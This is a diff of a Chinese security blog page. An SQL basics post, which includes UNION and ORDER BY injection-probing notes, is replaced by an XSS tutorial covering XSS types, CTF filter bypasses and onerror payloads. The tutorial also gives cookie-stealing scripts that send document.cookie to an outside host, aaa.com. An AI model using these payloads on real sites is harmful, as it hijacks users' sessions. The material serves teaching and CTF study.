@@ -45,7 +45,7 @@
     
     <title>
         
-            sql语句基础合集 | 
+            重新认识XSS | 
         
         ssssdl
     </title>
@@ -56,7 +56,7 @@
 
     <meta name="format-detection" content="telephone=no"/>
     <meta name="description" itemprop="description" content="">
-    <meta name="keywords" content=",SQL">
+    <meta name="keywords" content=",XSS">
     <meta name="theme-color" content="#0097A7">
 
     <!-- Disable Fucking Bloody Baidu Tranformation -->
@@ -217,7 +217,7 @@
     <!-- WebAPP Icons -->
     <meta name="mobile-web-app-capable" content="yes">
     <meta name="application-name" content="ssssdl">
-    <meta name="msapplication-starturl" content="http://blog.ssssdl.xyz/2018/06/20/sql语句基础合集/">
+    <meta name="msapplication-starturl" content="http://blog.ssssdl.xyz/2019/03/18/重新认识XSS/">
     <meta name="msapplication-navbutton-color" content="#0097A7">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-title" content="ssssdl">
@@ -236,16 +236,16 @@
     
 
     <!-- The Open Graph protocol -->
-    <meta property="og:url" content="http://blog.ssssdl.xyz/2018/06/20/sql语句基础合集/">
+    <meta property="og:url" content="http://blog.ssssdl.xyz/2019/03/18/重新认识XSS/">
     <meta property="og:type" content="blog">
-    <meta property="og:title" content="sql语句基础合集 | ssssdl">
+    <meta property="og:title" content="重新认识XSS | ssssdl">
     <meta property="og:image" content="/img/favicon.png">
     <meta property="og:description" content="">
-    <meta property="og:article:tag" content="SQL"> 
+    <meta property="og:article:tag" content="XSS"> 
 
     
-        <meta property="article:published_time" content="Wed Jun 20 2018 20:22:00 GMT+0800">
-        <meta property="article:modified_time" content="Fri Aug 24 2018 14:34:53 GMT+0800">
+        <meta property="article:published_time" content="Mon Mar 18 2019 15:49:41 GMT+0800">
+        <meta property="article:modified_time" content="Mon Mar 18 2019 15:53:20 GMT+0800">
     
 
     <!-- The Twitter Card protocol -->
@@ -253,7 +253,7 @@
 
     <!-- Add canonical link for SEO -->
     
-        <link rel="canonical" href="http://blog.ssssdl.xyz/2018/06/20/sql语句基础合集/index.html" />
+        <link rel="canonical" href="http://blog.ssssdl.xyz/2019/03/18/重新认识XSS/index.html" />
     
 
     <!-- Structured-data for SEO -->
@@ -265,10 +265,10 @@
 {
     "@context": "https://schema.org",
     "@type": "BlogPosting",
-    "mainEntityOfPage": "http://blog.ssssdl.xyz/2018/06/20/sql语句基础合集/index.html",
-    "headline": "sql语句基础合集",
-    "datePublished": "Wed Jun 20 2018 20:22:00 GMT+0800",
-    "dateModified": "Fri Aug 24 2018 14:34:53 GMT+0800",
+    "mainEntityOfPage": "http://blog.ssssdl.xyz/2019/03/18/重新认识XSS/index.html",
+    "headline": "重新认识XSS",
+    "datePublished": "Mon Mar 18 2019 15:49:41 GMT+0800",
+    "dateModified": "Mon Mar 18 2019 15:53:20 GMT+0800",
     "author": {
         "@type": "Person",
         "name": "ssssdl",
@@ -286,7 +286,7 @@
             "url": "/img/favicon.png"
         }
     },
-    "keywords": ",SQL",
+    "keywords": ",XSS",
     "description": "",
 }
 </script>
@@ -352,7 +352,7 @@
     </button>
 
     <ul class="post-toc-wrap mdl-menu mdl-menu--bottom-left mdl-js-menu mdl-js-ripple-effect" for="post-toc-trigger-btn" style="max-height:80vh; overflow-y:scroll;">
-        <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#0x00-大一基础整理"><span class="post-toc-number">1.</span> <span class="post-toc-text">0x00 大一基础整理</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#0x01-大二查询操作"><span class="post-toc-number">2.</span> <span class="post-toc-text">0x01 大二查询操作</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#通配符"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">通配符</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#子句"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">子句</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#关键字"><span class="post-toc-number">2.3.</span> <span class="post-toc-text">关键字</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#查询条件where"><span class="post-toc-number">2.4.</span> <span class="post-toc-text">查询条件where</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#聚集函数"><span class="post-toc-number">2.5.</span> <span class="post-toc-text">聚集函数</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#多表查询"><span class="post-toc-number">2.6.</span> <span class="post-toc-text">多表查询</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#集合查询"><span class="post-toc-number">2.7.</span> <span class="post-toc-text">集合查询</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#基于派生表的查询"><span class="post-toc-number">2.8.</span> <span class="post-toc-text">基于派生表的查询</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#0x02-数据库权限"><span class="post-toc-number">3.</span> <span class="post-toc-text">0x02 数据库权限</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#1-权限赋予"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">1. 权限赋予</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#2-权限收回"><span class="post-toc-number">3.2.</span> <span class="post-toc-text">2.权限收回</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#0x03-视图"><span class="post-toc-number">4.</span> <span class="post-toc-text">0x03 视图</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#0x04-索引"><span class="post-toc-number">5.</span> <span class="post-toc-text">0x04 索引</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#0x05-数据库导入导出"><span class="post-toc-number">6.</span> <span class="post-toc-text">0x05 数据库导入导出</span></a></li></ol>
+        <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x00-分类"><span class="post-toc-number">1.</span> <span class="post-toc-text">0x00 分类</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x01-CTF中的常见的XSS绕过"><span class="post-toc-number">2.</span> <span class="post-toc-text">0x01 CTF中的常见的XSS绕过</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x02-一些playload和利用工具"><span class="post-toc-number">3.</span> <span class="post-toc-text">0x02 一些playload和利用工具</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#先看一些payload"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">先看一些payload</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#相关链接-："><span class="post-toc-number">3.2.</span> <span class="post-toc-text">相关链接 ：</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x03-关于XSS防御"><span class="post-toc-number">4.</span> <span class="post-toc-text">0x03 关于XSS防御</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#大佬的文章"><span class="post-toc-number">5.</span> <span class="post-toc-text">大佬的文章</span></a></li></ol>
     </ul>
     
 
@@ -384,7 +384,7 @@
         
     
             <p class="article-headline-p">
-                sql语句基础合集
+                重新认识XSS
             </p>
         </div>
 
@@ -403,7 +403,7 @@
     <!-- Author Name & Date -->
     <div>
         <strong>ssssdl</strong>
-        <span>6月 20, 2018</span>
+        <span>3月 18, 2019</span>
     </div>
 
     <div class="section-spacer"></div>
@@ -427,7 +427,7 @@
     </button>
     <ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-viewtags-button">
         <li class="mdl-menu__item">
-        <a class="post_tag-link" href="/tags/SQL/">SQL</a>
+        <a class="post_tag-link" href="/tags/XSS/">XSS</a>
     </ul>
     
 
@@ -455,7 +455,7 @@
 
     <!-- Share Weibo -->
     
-        <a class="post_share-link" href="http://service.weibo.com/share/share.php?appkey=&title=sql语句基础合集&url=http://blog.ssssdl.xyz/2018/06/20/sql语句基础合集/index.html&pic=http://blog.ssssdl.xyz/img/favicon.png&searchPic=false&style=simple" target="_blank">
+        <a class="post_share-link" href="http://service.weibo.com/share/share.php?appkey=&title=重新认识XSS&url=http://blog.ssssdl.xyz/2019/03/18/重新认识XSS/index.html&pic=http://blog.ssssdl.xyz/img/favicon.png&searchPic=false&style=simple" target="_blank">
             <li class="mdl-menu__item">
                 分享到微博
             </li>
@@ -464,7 +464,7 @@
 
     <!-- Share Twitter -->
     
-        <a class="post_share-link" href="https://twitter.com/intent/tweet?text=sql语句基础合集&url=http://blog.ssssdl.xyz/2018/06/20/sql语句基础合集/index.html&via=ssssdl" target="_blank">
+        <a class="post_share-link" href="https://twitter.com/intent/tweet?text=重新认识XSS&url=http://blog.ssssdl.xyz/2019/03/18/重新认识XSS/index.html&via=ssssdl" target="_blank">
             <li class="mdl-menu__item">
                 分享到 Twitter
             </li>
@@ -473,7 +473,7 @@
 
     <!-- Share Facebook -->
     
-        <a class="post_share-link" href="https://www.facebook.com/sharer/sharer.php?u=http://blog.ssssdl.xyz/2018/06/20/sql语句基础合集/index.html" target="_blank">
+        <a class="post_share-link" href="https://www.facebook.com/sharer/sharer.php?u=http://blog.ssssdl.xyz/2019/03/18/重新认识XSS/index.html" target="_blank">
             <li class="mdl-menu__item">
                 分享到 Facebook
             </li>
@@ -482,7 +482,7 @@
 
     <!-- Share Google+ -->
     
-        <a class="post_share-link" href="https://plus.google.com/share?url=http://blog.ssssdl.xyz/2018/06/20/sql语句基础合集/index.html" target="_blank">
+        <a class="post_share-link" href="https://plus.google.com/share?url=http://blog.ssssdl.xyz/2019/03/18/重新认识XSS/index.html" target="_blank">
             <li class="mdl-menu__item">
                 分享到 Google+
             </li>
@@ -494,7 +494,7 @@
 
     <!-- Share QQ -->
     
-        <a class="post_share-link" href="http://connect.qq.com/widget/shareqq/index.html?site=ssssdl&title=sql语句基础合集&summary=&pics=http://blog.ssssdl.xyz/img/favicon.png&url=http://blog.ssssdl.xyz/2018/06/20/sql语句基础合集/index.html" target="_blank">
+        <a class="post_share-link" href="http://connect.qq.com/widget/shareqq/index.html?site=ssssdl&title=重新认识XSS&summary=&pics=http://blog.ssssdl.xyz/img/favicon.png&url=http://blog.ssssdl.xyz/2019/03/18/重新认识XSS/index.html" target="_blank">
             <li class="mdl-menu__item">
                 分享到 QQ
             </li>
@@ -513,99 +513,125 @@
                 <!-- Post Content -->
                 <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
     
-        <h1 id="0x00-大一基础整理"><a href="#0x00-大一基础整理" class="headerlink" title="0x00 大一基础整理"></a>0x00 大一基础整理</h1><blockquote>
-<p>整理一波自己以前用的比较基本的sql语句，还有一些MySQL orcale 数据库的操作，</p>
+        <blockquote>
+<p>最近找实习的时候被问到里一个关于XSS的问题，觉得原来学的还不怎么够，决定稍微深入一波。</p>
+</blockquote>
+<h2 id="0x00-分类"><a href="#0x00-分类" class="headerlink" title="0x00 分类"></a>0x00 分类</h2><ol>
+<li>反射性XSS</li>
+<li>存储型XSS</li>
+<li>DOM based XSS</li>
+</ol>
+<blockquote>
+<p>这里面存储型XSS危害最大，反射性和DOM的不同是DOM based XSS是通过修改页面的DOM节点来形成XSS，但是从效果上看和反射性XSS类似。</p>
+</blockquote>
+<h2 id="0x01-CTF中的常见的XSS绕过"><a href="#0x01-CTF中的常见的XSS绕过" class="headerlink" title="0x01 CTF中的常见的XSS绕过"></a>0x01 CTF中的常见的XSS绕过</h2><p>做过一些题目总结大概就是下面几种：</p>
+<ol>
+<li><p>编码绕过</p>
+<blockquote>
+<p>编码绕过，主要时针对一些服务端对数据的一些转码，常见的比如构造js输出\u003c \u003e这样的十六进制编码代替&lt;&gt;，还有url编码，以及<code>&amp;#x27;</code>这样的html编码也可以绕过,比如白帽子讲web安全中的例子</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">&lt;a href=# onclick=&quot;alert(&apos;&amp;#x27;&amp;#x29;&amp;#x3b;alert&amp;#x28;&amp;#x27;2&apos;);&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>
 </blockquote>
 <blockquote>
-<p>不包括设置制约关系，触发器等知识（有时间再整理），就是简单的增删改查等操作，整理的比较随意，将就着看  。。。（有时间还会更新）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">mysql -h127.0.0.1 -u用户名 -p密码 本地打开mysql命令行</span><br><span class="line"></span><br><span class="line">更改密码 update user set authentication_string = PASSWORD(&apos;你自己的密码&apos;) where user=&apos;root&apos;;</span><br><span class="line">        ALTER USER &apos;root&apos;@&apos;localhost&apos; IDENTIFIED BY &apos;new_password&apos;;</span><br><span class="line">        使设定立即生效 （用于更改密码后） flush privileges; </span><br><span class="line">退出 exit；</span><br><span class="line">查询MySQL版本信息 select version();（可以用于判断是否有可以爆信息的information—schema）</span><br><span class="line">查询使用者权限或者用户名 select user();</span><br><span class="line">查询当前所在的库 select database();</span><br><span class="line">显示所有库 show databases;</span><br><span class="line">使用某个库 use 库名；</span><br><span class="line">显示当前库下的所有表 show tables;</span><br><span class="line">创建一个库 create database 库名;</span><br><span class="line">删除一个库 drop database text;</span><br><span class="line">在当前库下添加一个表，表里有id（整型），username（char字符串型），password（char字符串型）</span><br><span class="line">      create table 表名(id int, username varchar(20), password varchar(20) );</span><br><span class="line">在当前库下的某个表下添加括号里数据 insert into 表名 values(1,’admin’,’123’);</span><br><span class="line">要给表添加一列，列名为gender，类型为varchar，长度为2，用如下语句：alter table user add gender varchar(2);</span><br><span class="line">查看列：desc 表名;</span><br><span class="line">修改表名：alter table t_book rename to bbb;</span><br><span class="line">添加列：alter table 表名 add column 列名 varchar(30);</span><br><span class="line">删除列：alter table 表名 drop column 列名;</span><br><span class="line">修改列名MySQL： alter table bbb change nnnnn hh int;</span><br><span class="line">修改列名SQLServer：exec sp_rename&apos;t_student.name&apos;,&apos;nn&apos;,&apos;column&apos;;</span><br><span class="line">修改列名Oracle：lter table bbb rename column nnnnn to hh int;</span><br><span class="line">修改列属性：alter table t_book modify name varchar(22);</span><br><span class="line">删除user表下id=2的数据：delete from user where id=2;</span><br><span class="line"></span><br><span class="line">DROP DATABASE tutorial_database;</span><br><span class="line">如果该数据库tutorial_database不存在，那么你会收到此错误：</span><br><span class="line">ERROR 1008 (HY000): Can&apos;t drop database &apos;tutorial_database&apos;; database doesn&apos;t exist</span><br><span class="line">为了避免出现此错误使用下面的命令：</span><br><span class="line">DROP DATABASE IF EXISTS tutorial_database;</span><br><span class="line"></span><br><span class="line">查询表下所有信息 select * from 表名;     *是一个通配符</span><br><span class="line">显示表的字段信息 dasc 表名;</span><br><span class="line"></span><br><span class="line">一些关键字：</span><br><span class="line">@@version_compile_os 服务器系统信息</span><br><span class="line">   @@basedir MySQL装在电脑那个目录里</span><br><span class="line">   @@datadir 也是和MySQL目录有关的</span><br><span class="line">   @@temdir 未知</span><br><span class="line">   使用方法：mysql&gt; select *from 表名 where id=-1 and 写一个为真的条件（例如1=1） union select version(),@@version_compile_os,@@datadir;（最多同时查寻数据不得超过表中字段数，剩余的位置用数字填充）</span><br><span class="line">   这样会显示出MySQL版本信息，服务器系统信息，MySQL安装目录</span><br><span class="line">查询当ID=1时的数据 select * from 表名 where id =1; </span><br><span class="line">查询当id=1时，username,password字段的数据 select username,password from 表名 where id =1;</span><br><span class="line">   查询当username=”admin”时，password字段的数据 select password from 表名 where username=”admin”;</span><br><span class="line">查询语句 select * from 表名 where id=‘1’and exists(select * from user )；其中exists（）是逐条查询函数，只要表里有信息就返回真。（觉得适用于注入时判断表中是否有信息）</span><br><span class="line">判断表中字段条数 order by 数字;</span><br><span class="line">   例子：mysql&gt; select *from 表名 where id=1 and 1=1 order by 3;//猜中或者猜小会正常显示 </span><br><span class="line">         +------+----------+----------+</span><br><span class="line">         | id   | username | password |</span><br><span class="line">         +------+----------+----------+</span><br><span class="line">         |    1 | admin    | 123      |</span><br><span class="line">         +------+----------+----------+</span><br><span class="line">         1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">         mysql&gt; select *from 表名 where id=1 and 1=1 order by 4;//猜大会报错或者不显示</span><br><span class="line">         ERROR 1054 (42S22): Unknown column &apos;4&apos; in &apos;order clause&apos;</span><br><span class="line">联合查询把1234等数字放在显示的表中 union select 1,2,3,4,……,n;（n是上一步查询到的字段条数）</span><br><span class="line">   例子：mysql&gt; select *from 表名 where id=1 and 1=1 union select 1,2,3;</span><br><span class="line">         +------+----------+----------+</span><br><span class="line">         | id   | username | password |</span><br><span class="line">         +------+----------+----------+</span><br><span class="line">         |    1 | admin    | 123      |</span><br><span class="line">         |    1 | 2        | 3        |</span><br><span class="line">         +------+----------+----------+</span><br><span class="line">         2 rows in set (0.00 sec)</span><br><span class="line">         此时把id=1换成id=-1，可以消去第一条数据</span><br><span class="line">联合查询显示表中所有信息，使用方法见21 union select 字段，字段，.....，字段 from admin;(前后字段数目必须一致)</span><br><span class="line"></span><br><span class="line">1、查看mysql版本</span><br><span class="line">方法一：status;</span><br><span class="line">方法二：select version();</span><br><span class="line"></span><br><span class="line">2、Mysql启动、停止、重启常用命令</span><br><span class="line">a、启动方式</span><br><span class="line">1、使用 service 启动：</span><br><span class="line">[root@localhost /]# service mysqld start (5.0版本是mysqld)</span><br><span class="line">[root@szxdb etc]# service mysql start (5.5.7版本是mysql)</span><br><span class="line"></span><br><span class="line">2、使用 mysqld 脚本启动：</span><br><span class="line">/etc/inint.d/mysqld start</span><br><span class="line"></span><br><span class="line">3、使用 safe_mysqld 启动：</span><br><span class="line">safe_mysqld&amp;</span><br><span class="line"></span><br><span class="line">b、停止</span><br><span class="line">1、使用 service 启动：</span><br><span class="line">service mysqld stop</span><br><span class="line"></span><br><span class="line">2、使用 mysqld 脚本启动：</span><br><span class="line">/etc/inint.d/mysqld stop</span><br><span class="line"></span><br><span class="line">3、mysqladmin shutdown</span><br><span class="line"></span><br><span class="line">c、重启</span><br><span class="line">1、使用 service 启动：</span><br><span class="line">service mysqld restart</span><br><span class="line">service mysql restart (5.5.7版本命令)</span><br><span class="line"></span><br><span class="line">2、使用 mysqld 脚本启动：</span><br><span class="line">/etc/init.d/mysqld restart</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">orcale数据库</span><br><span class="line"></span><br><span class="line">打开服务</span><br><span class="line">sqlplus</span><br><span class="line"></span><br><span class="line">解锁scott用户</span><br><span class="line"></span><br><span class="line">管理员登录</span><br><span class="line">sqlplus(空格)/nolog</span><br><span class="line">conn sys/password as sysdba</span><br><span class="line">解锁scott</span><br><span class="line">alter user scott account unlock;</span><br><span class="line">修改scott的登录密码：</span><br><span class="line">alter user scott identified by tiger;</span><br><span class="line">scott登录</span><br><span class="line">conn scott/tiger</span><br><span class="line"></span><br><span class="line">https://blog.csdn.net/yali1990515/article/details/51732427</span><br></pre></td></tr></table></figure></p>
+<p>这段代码的执行结果就是相当于</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">&lt;a href=# onclick=&quot;alert(&apos;&apos;);alert(&apos;2&apos;);&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>
 </blockquote>
 <blockquote>
-<p>以上是大一的时候自学数据库的时候赞的一些sql语句，感觉有一些还挺有意思的，先这么放着吧，懒得整理。</p>
-</blockquote>
-<h1 id="0x01-大二查询操作"><a href="#0x01-大二查询操作" class="headerlink" title="0x01 大二查询操作"></a>0x01 大二查询操作</h1><h2 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h2><ul>
-<li>*查询所有列 一般用在列哪里</li>
-<li>%百分号代表任意长度字符串，a%b代表以a开头，以b结尾的字符串</li>
-<li>_下划线代表一个字符，和%一样用like用于模糊查询之类的，注意数据库字符集为ASCII时一个汉字两个下划线，当字符集为gbk时就只需要一个<blockquote>
-<p>不需要通配符，但要输入下划线百分号时用\转义</p>
+<p>具体什么时候使用什么样的编码还要根据语境，推测开发者使用了什么样的过滤函数，然后有的时候sql注入的编码技巧放在xss也同样会起到作用，比如常见的宽字节什么的有的时候在构造xss时会起到独到的作用。</p>
 </blockquote>
 </li>
-</ul>
-<h2 id="子句"><a href="#子句" class="headerlink" title="子句"></a>子句</h2><ul>
-<li>order by 列名 ASC/DESC 按这一列升序/降序排序</li>
-<li>group by 列名 having 条件 按照这一列进行分组返回满足条件的，having可以不用，一般和聚集函数配套使用，列可以是一个也可以是多个</li>
-</ul>
-<h2 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h2><ul>
-<li>distinct/all 用在要查询的列名前  distinct去掉这一列重复的数据，默认是all</li>
-</ul>
-<h2 id="查询条件where"><a href="#查询条件where" class="headerlink" title="查询条件where"></a>查询条件where</h2><ul>
-<li>比较 大于小于等于不等之类的符号</li>
-<li>（not） between and 用于确定范围</li>
-<li>（not） like 用于字符匹配</li>
-<li>（not） in 确定是否再某个集合，一般会用在子查询，或者… in (“1”,”2”)</li>
-<li>（not） is NULL 判断是否为空值</li>
-<li>连接：and or not</li>
-</ul>
-<h2 id="聚集函数"><a href="#聚集函数" class="headerlink" title="聚集函数"></a>聚集函数</h2><ul>
-<li>count() 查询元祖(*)个数、或者列中值的个数(列名)</li>
-<li>sum() 计算一列值的总和</li>
-<li>avg() 计算一列值的平均值</li>
-<li>max() 计算一列值的最大值</li>
-<li>min() 计算一列值的最小值<blockquote>
-<p>这里的列可以用distinct/all限制，去重复，还有就是除了查询元祖个数，全部跳过空值，聚集函数只等用在select子句和group by 中的having子句中</p>
+<li>重写大小写等等绕过<blockquote>
+<p>CTF以前会见到的就是重写或者大小写绕过，还有就是利用DOM XSS触发代替直接的<code>&lt;script&gt;</code>标签代码插入，现在基本比较少吧。</p>
 </blockquote>
 </li>
-</ul>
-<h2 id="多表查询"><a href="#多表查询" class="headerlink" title="多表查询"></a>多表查询</h2><ul>
-<li>连接查询<blockquote>
-<p>例：<code>select stu.*,sc.* from stu,sc where stu.sno=sc.cno;</code><br>from后面可以给表重命名，以便相同的表，使用不同条件，还有from后面可以使用left outer join关键字左右连接</p>
+<li>可利用事件和相似函数绕过<blockquote>
+<p>事件最常见的就是<code>&lt;img src=# onerror=alert(1)&gt;</code>这种的，然后一些其他的DOM事件可以参考<a href="http://www.w3school.com.cn/js/js_htmldom_events.asp" target="_blank" rel="noopener">JavaScript HTML DOM 事件
+</a><br>相似的函数也比较多吧，比如confirm(‘a’)代替alert这种的主要主要还是要看过滤情况，感觉现实应用中比较常见的XSS不成功的问题还是出现在转码上，利用DOM事件和特殊JS函数也都是简历在绕过了一些字符转义之后才能实现。</p>
 </blockquote>
 </li>
-<li>嵌套查询<blockquote>
-<p>例：<code>select *from stu where sno in(select sno from con=&#39;2&#39;);</code><br>查询选了课程2的学生信息，<br>查询条件也可以不用in 换成比较条件或者比较条件+any/all 不等于可以用&lt;&gt;表示，<br>子查询前可以用（not） exists限制  exists限制的子查询只返回true/false</p>
-</blockquote>
-</li>
-</ul>
-<h2 id="集合查询"><a href="#集合查询" class="headerlink" title="集合查询"></a>集合查询</h2><ul>
-<li>并操作 union</li>
-<li>交操作 intersect</li>
-<li>差操作 except</li>
-</ul>
-<h2 id="基于派生表的查询"><a href="#基于派生表的查询" class="headerlink" title="基于派生表的查询"></a>基于派生表的查询</h2><blockquote>
-<p>子查询用在from时生成临时表（派生表），的查询<br>例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select sno</span><br><span class="line">from stu,(select sno from sc where cno=&apos;1&apos;) as sc1</span><br><span class="line">where stu.sno=sc1.sno;</span><br></pre></td></tr></table></figure></p>
-</blockquote>
-<h1 id="0x02-数据库权限"><a href="#0x02-数据库权限" class="headerlink" title="0x02 数据库权限"></a>0x02 数据库权限</h1><h2 id="1-权限赋予"><a href="#1-权限赋予" class="headerlink" title="1. 权限赋予"></a>1. 权限赋予</h2><ul>
-<li><p><code>grant select on table student to u1;</code></p>
+</ol>
 <blockquote>
-<p>给u1查询student表的权限,to public 代表所有用户  但u1不可以传播权限</p>
+<p>其实这些感觉总结的也并不全面，主要还是要靠具体情况具体分析，看看自己能控制的参数的位置，做了哪些过滤，是否有利用价值等等吧。具体问题具体分析。</p>
 </blockquote>
-</li>
-<li><p><code>grant select(sno) on table student to u1 with grant option;</code></p>
+<h2 id="0x02-一些playload和利用工具"><a href="#0x02-一些playload和利用工具" class="headerlink" title="0x02 一些playload和利用工具"></a>0x02 一些playload和利用工具</h2><blockquote>
+<p>最最常见的利用xss劫持用户cookie然后进行CSRF，这个可以自己搭建接收cookie的平台，也可以利用一些xss平台和工具实现，但是窃取cookie不是什么时候都有用，因此还比较常见还有利用xss使用户端执行恶意js代码后台直接发起一些get或者post请求，或者获取一些用户电脑和浏览器上的信息，还有就是比较新的js挖矿，Dos攻击，内网探测等，看过一些大佬的文章，大佬总能把XSS玩出各种花样。  </p>
+</blockquote>
+<h3 id="先看一些payload"><a href="#先看一些payload" class="headerlink" title="先看一些payload"></a>先看一些payload</h3><ol>
+<li><p>劫持cookie</p>
 <blockquote>
-<p>给u1查询sno的权限，而且u1可以把权限给其他用户  </p>
+<p>获取cookie:其实就是想办法发送<code>document.cookie</code>到攻击者事先准备好的互联网上的就收接口。发送的方式有很多，比较常用的是利用src的请求直接get发送比如</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//稍微短一些可以</span><br><span class="line">&lt;script&gt;document.write(&quot;&lt;iframe width=0 height=0 src=&apos;http://aaa.com/cookie.php?cookie=&quot;+document.cookie+&quot;&apos;&gt;&lt;/iframe&gt;&quot;);&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">//或者直接加载远程脚本，然后脚本里面就可以想怎么发就怎么发了，列举书中提到的一个例子，xsspt上也用的类似的方式获取cookie：</span><br><span class="line">var img = document.createElement(&quot;img&quot;);</span><br><span class="line">img.src = &quot;http://aaa.com/cookie.php?cookie=&quot;+document.cookie;</span><br><span class="line">document.body.appendChild(img);</span><br></pre></td></tr></table></figure>
 </blockquote>
-<h2 id="2-权限收回"><a href="#2-权限收回" class="headerlink" title="2.权限收回"></a>2.权限收回</h2></li>
-<li><p><code>revoke select on table student from u1;</code></p>
 <blockquote>
